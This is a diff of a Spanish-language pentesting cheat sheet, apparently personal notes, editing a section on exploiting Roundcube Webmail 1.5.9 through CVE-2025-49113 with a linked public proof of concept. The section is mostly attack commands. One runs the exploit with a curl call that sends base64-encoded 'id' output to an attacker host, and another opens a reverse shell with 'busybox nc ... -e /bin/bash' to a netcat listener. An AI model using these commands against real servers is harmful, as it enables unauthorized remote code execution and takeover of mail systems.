@@ -69,7 +69,7 @@ NOTA: La lista de usuarios puede ser personalizada
 ❯ strings /usr/share/wordlists/rockyou.txt > /usr/share/wordlists/rockyou_clean.txt
 ```
 
-## Roundcube Webmail 1.5.9
+## Shell - Roundcube Webmail 1.5.9
 * [PoC CVE-2025-49113](https://github.com/hakaioffsec/CVE-2025-49113-exploit)
 ```bash 
 # Se necesitan credenciales válidas 
@@ -77,17 +77,18 @@ NOTA: La lista de usuarios puede ser personalizada
 1.5.0 - 1.5.9
 1.6.0 - 1.6.10
 
-Paso 1:
+Paso 1: Verificar que si funciona el exploit 
 ❯ python3 -m http.server 80
 
-Paso 2: Verificar que si funciona el exploit 
 ❯ php CVE-2025-49113.php http://IP/roundcube/ user 'Password' 'curl http://IP_Kali/$(id|base64 -w0)'
 	# Usuario válido 
 	# Password del usuario válido 
 
-Paso 3:
++++++
+
+Paso 2:
 ❯ penelope -p 4445
 
-Paso 4: Ejecutar una revershell 
+Paso 3: Ejecutar una revershell 
 ❯ php CVE-2025-49113.php http://IP/roundcube/ user 'Password' 'busybox nc IP_Kali 4445 -e /bin/bash'
 ```
